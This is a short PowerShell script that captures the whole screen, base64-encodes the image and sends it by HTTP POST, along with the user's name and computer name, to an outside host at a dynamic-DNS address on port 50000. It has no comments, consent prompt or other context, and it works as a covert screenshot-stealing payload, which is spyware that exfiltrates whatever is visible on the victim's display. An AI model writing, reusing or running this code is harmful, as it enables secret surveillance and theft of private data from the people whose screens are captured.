Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top

$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$stream = New-Object System.IO.MemoryStream
$bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
$base64 = [Convert]::ToBase64String($stream.ToArray())
$stream.Close()
$graphic.Dispose()
$bitmap.Dispose()
Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveScreenshot -Method POST -Body @{data = $base64; username = $Env:UserName; ComputerName = $Env:ComputerName } 
